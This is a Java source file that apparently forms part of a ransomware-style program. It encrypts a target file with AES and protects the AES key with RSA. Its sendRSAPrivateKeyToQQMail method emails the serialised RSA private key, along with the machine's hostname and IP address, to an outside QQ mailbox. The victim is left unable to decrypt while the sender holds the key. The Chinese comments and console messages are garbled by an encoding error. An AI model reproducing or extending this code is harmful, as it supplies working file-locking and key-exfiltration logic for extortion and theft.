package com.encrypt;

import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPrivateKey;
import java.security.spec.InvalidKeySpecException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

import org.apache.commons.codec.binary.Base64;

import com.utils.Utils;

public class RSAEncryptAES {
	private RSADemo rsa = null;
	private AESDemo aes = null;
	private static RSAEncryptAES rsaEncryptAES = new RSAEncryptAES();//����ģʽ
	public static RSAEncryptAES getRSAEncryptAES()
	{
		return rsaEncryptAES;
	}
	private RSAEncryptAES()
	{
		/*****��ʼ��******/
		rsa = new RSADemo();
		aes = new AESDemo();
		try {
			aes.initAESCipher(true);
		} catch (InvalidKeyException | NoSuchAlgorithmException
				| NoSuchPaddingException e) {
			e.printStackTrace();
		}
		try {
			rsa.initRSACipher(true);
		} catch (NoSuchAlgorithmException | NoSuchPaddingException
				| InvalidKeySpecException | ClassNotFoundException
				| IOException e) {
			e.printStackTrace();
		}
	}
	/*
	 * ����ģ��
	 */
	public void encrypt(File sourceFile) throws InvalidKeyException, IllegalBlockSizeException, BadPaddingException, IOException, NoSuchAlgorithmException, NoSuchPaddingException, AddressException, MessagingException
	{
		
	//	File sourceFile = new File("D:\\jdk.exe");
		if(!sourceFile.exists())
		{
			System.out.println("�������ļ�������!");
			return ;
		}
		/*********AES�����ļ�***********/
		
		SecretKey aesKey = aes.getAESKey();
		System.out.println("����ǰAES��ԿΪ��" + Base64.encodeBase64String(aesKey.getEncoded()));
		rsa.encryptAESKey(sourceFile, aesKey);
		aes.encryptFile(sourceFile, true);
		System.out.println("AES�����ļ���ɣ�");
		
	}
	
	public void sendRSAPrivateKeyToQQMail() throws IOException, AddressException, MessagingException
	{
		RSAPrivateKey privateKey = rsa.getRSAPrivateKey();
		File serializeFile = rsa.getRSAPrivateKeySerialize();
		System.out.println("RSA˽Կ���л��ļ�Ϊ:" + serializeFile.getPath());
		SendRSAPrivateKey sendRSAPrivateKey = new SendRSAPrivateKey();
		sendRSAPrivateKey.sendQQMail("RSA˽Կ", "����һ̨��������������" + Utils.getLocalHostName() + "   IP:" + Utils.getLocalIp(), serializeFile);
	    System.out.println("RSA˽Կ�ļ��Ѿ����͵�������");
		
	}

}
